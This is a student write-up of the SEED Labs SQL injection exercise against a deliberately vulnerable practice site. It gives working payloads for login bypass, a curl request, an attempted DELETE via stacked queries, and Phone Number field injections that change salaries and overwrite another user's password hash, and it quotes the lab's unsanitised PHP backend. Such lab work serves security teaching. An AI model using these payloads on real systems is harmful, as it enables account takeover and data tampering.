# SQL-INJECTION
<table>
  <thead>
    <tr>
      <th>Title</th>
      <th>Author</th>
      <th>Date</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>SQL Injection Attack Seed Lab Ubunto 16.04</td>
      <td>M.Umer Hassan</td>
      <td>30-10-2021</td>
    </tr>
  </tbody>
</table>
<h1>Task 1</h1>
<h3>Login MYSQL:</h3>
<p>mysql -u root -pseedubuntu<br>
   mysql> use Users;<br>
   mysql> show tables;<br>
</p>
<h3>Use Such a SQL Query:</h3>
<p>select * from credential where Name = 'Alice';</p>
<p>Screen shoot is in SQL Injection Folder</p>
<h1>Task 2</h1>
<h2>Task 2.1</h2>
<ul>
<li>USERNAME: "Admin' #"</li>
<li>PASSWORD: "*" whatever the password was</li> 
</ul>
<h3>It will result in a SQL Query as:</h3>
<p>SELECT id, name, eid, salary, birth, ssn, address, email,<br>
   nickname, Password<br> 
   FROM credential<br>
   WHERE name= 'Admin' #' and Password='*'
   </p>
<p>Then statement after <code>#</code> will bi regarded as comments. So we can login in as <code> Admin</code>.</p>
<p>Screen shoot is in SQL Injection Folder</p>
<h2>Task 2.2</h2>
<pre>
<code>
curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23Password=xyz'
</code>
</pre>
<p>It will return a bunch of <code>html</code>code. When exporting outputs to file by<code> > temp.html</code>and open it</p>
<p>Screen shoot is in SQL Injection Folder</p>
<h2>Task 2.3</h2>
<p>We neeed to delete such a statement to append a row to current database:</p>
<code>DELETE credential where name='ted';
</code><br>
<p>So constructed:</p>
<ul>
<li>USERNAME: <code>" '1=1; DELETE credential where name='ted';#"</code></li>
<li>PASSWORD: <code>" "</code> (Remain Blank)</li> 
</ul>
<p>It fails and alerts with a syntax error:</p>
<p>Screen shoot is in SQL Injection Folder</p>
<p>Because in PHP's <code>mysqli</code> extension, which invokes <code>mysqli::query</code>  API to handle SQL statements, it doesn't support for multiple queries within the same run. Of course, the design of this API attributes to the concern of SQL injection.</p>
<h1>Task 3</h1>
<p>It's hard to find the navigation buttons on this website <br>(<a href="http://www.SeedLabSQLInjection.com" rel="nofollow">www.SeedLabSQLInjection.com</a>).
<p>In order to edit the profile, please log in and then jump to the link address: <br><a href="http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php" rel="nofollow">http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php</a> by Hand.</p>
<h2>Task 3.1</h2>
<p>Log in with Alice's username and password, enter <br> <a href="http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php" rel="nofollow">http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php</a></p>
<p>Modify Phone Number as <code>', Salary=500000</code> and save</p>
<h2>Task 3.2</h2>
<p>Log in with username <code>Boby' #</code>  and arbitrary password, open his profile edit page.</p>
<p>Fill in with:</p>
<p>Phone Number: <code>', Salary=1</code></p>
<p>And keep other properties unchanged. Submit the modification.</p>
<p>Now, you can see:</p>
<p>Screen shoot is in SQL Injection Folder</p>
<p>Log-in as Alice</p>
<p>Assume instead of logging in as Boby using inject method, We keep the login in as Alice, and open Alice's profile edit page.</p>
<p>We should change the Phone Number as</p> 
<pre><code>', Salary=1 where name='Boby' #</code></pre>
<h2>Task 3.3</h2>
<p>Of course, the simplest approach is to log-in as Boby like <code>Task 3.2</code> and change the password.</p>
<p>If we must do all things and keep log-in with Alice's own account. We might face such an issue:</p>
<p>According to code below in <code>unsafe_edit_backend.php</code>, if <strong>Password</strong> is to be updated, the session's <code>pwd</code> will be updated first, which makes our user authentication invalid immediately and the modification dropped. So we cannot modify the password field directly using Alice's authentication.</p>
<pre><span class="pl-s1"><span class="pl-c1">$</span>conn</span> = <span class="pl-en">getDB</span>();
<span class="pl-c">// Don't do this, this is not safe against SQL injection attack</span>
<span class="pl-s1"><span class="pl-c1">$</span>sql</span>=<span class="pl-s">""</span>;
<span class="pl-k">if</span>(<span class="pl-s1"><span class="pl-c1">$</span>input_pwd</span>!=<span class="pl-s">''</span>){
<span class="pl-c">// In case password field is not empty.</span>
<span class="pl-s1"><span class="pl-c1">$</span>hashed_</span> = <span class="pl-en">sha1</span>(<span class="pl-s1"><span class="pl-c1">$</span>input_pwd</span>);
<span class="pl-c">//Update the password stored in the session.</span>
<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_SESSION</span></span>[<span class="pl-s">'pwd'</span>]=<span class="pl-s1"><span class="pl-c1">$</span>hashed_pwd</span>;
<span class="pl-s1"><span class="pl-c1">$</span>sql</span> = <span class="pl-s">"UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;"</span>;
}<span class="pl-k">else</span>{
<span class="pl-c">// if passowrd field is empty.</span>
<span class="pl-s1"><span class="pl-c1">$</span>sql</span> = <span class="pl-s">"UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',PhoneNumber='$input_phonenumber' where ID=$id;"</span>;
}
<span class="pl-s1"><span class="pl-c1">$</span>conn</span>-&gt;<span class="pl-en">query</span>(<span class="pl-s1"><span class="pl-c1">$</span>sql</span>);
<span class="pl-s1"><span class="pl-c1">$</span>conn</span>-&gt;<span class="pl-en">close</span>();
<span class="pl-en">header</span>(<span class="pl-s">"Location: unsafe_home.php"</span>);
<span class="pl-en">exit</span>();</pre>
<p>We should do all things in <strong>Phone Number</strong> field.</p>
<p>Assume we want to change Boby's password as <code>tedwashere</code>. First, we should get SHA1 value of our new password via some <a href="http://www.sha1-online.com/" rel="nofollow">online tool</a> as</p>
<pre><code>1b3263246794fe4094be7ae99e21b34454d9676f
</code></pre>
<p>Then construct <strong>Phone Number</strong> as:</p>
<pre><code>', password='1b3263246794fe4094be7ae99e21b34454d9676f' where name='Boby' #
</code></pre>
<p>and save. Now, the change works. You can log in with username <code>Boby</code> and password <code>tedwashere</code>.</p>
<p>Verify:</p>
<p>Screen shoot is in SQL Injection Folder</p>
